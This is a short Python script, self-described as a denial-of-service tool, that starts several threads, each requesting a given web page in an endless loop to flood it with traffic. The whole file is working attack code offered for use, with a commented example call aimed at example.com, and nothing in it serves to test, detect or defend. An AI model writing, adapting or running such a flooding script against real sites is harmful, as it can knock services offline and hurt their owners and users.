import requests
import threading
import time

continueDos = True
thread = []
numRequests = 0
waitForDos = 1
threadsinited = 0
threads = 1

def dos(webPage_):
    global continueDos, numRequests
    webPage = str(webPage_)
    while continueDos:
        '''
        The dosing happens here. It is done by
        requesting the sites html code rappidly. The rest
        of the code is making it faster via mutliple threads
        and making the software easier to use
        '''
        print(webPage)
        requests.get(webPage)
        # print("requested:", webPage)
        numRequests += 1
        if (continueDos == False):
            break

class reqThread (threading.Thread):
    def __init__(self, webPage):
        threading.Thread.__init__(self)
        self.webPage = webPage
    def run(self):
        dos(self.webPage)



# This is the function the threads will be running
def initThreads(*webPages):
    global thread, threads, waitForDos, continueDos, numRequests, threadsinited
    continueDos = True
    thread = []
    numRequests = 0
    threadsinited = 0
    webPages = webPages[0]

    # This creates the threads, but does not start it
    for i in range(threads):
        print('created Web Page: {} Thread ID: {} Total Threads: {}'.format(webPages, i, len(webPages)))
        thread.append(reqThread(webPages[i % len(webPages)]))
    
    for i in range(waitForDos):
        print("Starting threads in {}".format(waitForDos - i))
        time.sleep(1)
    print("Starting threads")

    # This activates the threads
    for i in range(threads):
        thread[i].start()
        threadsinited+=1

# If you want to call the sequence directly with the function
# initThreads('https://example.com', 1)